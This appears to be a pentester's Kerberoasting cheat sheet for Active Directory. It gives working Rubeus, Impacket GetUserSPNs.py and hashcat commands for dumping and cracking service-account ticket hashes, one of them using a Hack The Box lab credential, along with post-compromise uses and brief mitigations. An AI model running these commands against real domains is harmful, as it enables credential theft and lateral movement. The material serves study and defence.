# Kerberoasting
##### Introduction
Kerberoasting allows a user to request a service ticket for any service with a registered *SPN(Service Principal Name)* then use that ticket to crack the **service account** password.

Normally the response for a requested service ticket would then get sent to that specific service, but instead with Kerberoasting we take that response offline and try to manually crack it.

This is essentially cracking the password for a Service Account, which is tied to a particular service. Hopefully that service account will then either have privileges it shouldn't, or at the very least we could use the password for spraying etc.

[Tim Medin - Attacking Kerberos](https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf)

##### Locally 
**PowerShell & Mimikatz**
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting

**Rubeus.exe**
Run this locally on an AD machine.

*Dump the hashes.*
```
`Rubeus.exe kerberoast`
```

*Crack the hash!*
```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

##### Remote
**GetUserSPNs.py**
This is the same output as above but can be done over a network.

```
sudo python3 GetUserSPNs.py DOMAIN_CONTROLLER/USER:PASS -dc-ip DOMAIN_CONTROLLER_IP -request

python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
```

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

**Uses for Service Accounts**
- If it is a domain admin, you have a golden ticket and could dump the global password hash file NTDS.dit
- If it is not a domain admin, you can login to other services, or spray that password against other accounts.

##### Kerberoasting Mitigation
- Strong Service Passwords - *If the service account passwords are strong then kerberoasting will be ineffective*
- Don't Make Service Accounts Domain Admins - *Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.*